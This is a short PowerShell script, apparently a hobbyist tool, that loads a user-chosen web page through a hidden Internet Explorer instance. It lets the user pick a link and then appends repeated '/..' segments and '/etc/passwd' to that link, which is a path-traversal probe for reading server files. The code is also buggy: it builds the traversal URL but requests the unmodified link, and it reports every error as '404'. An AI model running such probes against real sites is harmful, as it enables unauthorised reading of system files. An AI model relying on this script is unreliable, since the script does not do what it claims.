####################################################################################
#@author - Jerome Themee
#@version - 1.0
#date - 12/15/2016
####################################################################################

#check IE process open and close it
Get-Process iexplore | Stop-Process

#get client and request from PS with IE
$url = read-host "Which URL would you like to go ?"
$client = New-Object -ComObject internetexplorer.application.1
$client.visible = $false
$client.Navigate($url)
Start-Sleep 6
$link = $client.Document.getElementsByTagName("a") | Select-Object -Property href

#Trim all shit like other URI and stuff
for($i=0;$i -le $link.length;$i++){
 
  write-host $i $link[$i]

}

#choose a link to fuzz
$choice = read-host "choose a link to fuzz (enter a number)"

#get fuzzing
for($i=0;$i -le 15;$i++){
    try{
    $makeRequest = $link[$choice].href + ("/..") * $i + ("/etc/passwd")
    $makeRequest
    $targetUrl = [net.WebRequest]::Create($link[$choice].href)
    $targetUrl.GetResponse()}
    catch{
        write-host "404 error, no LFI/RFI :=("
    }
}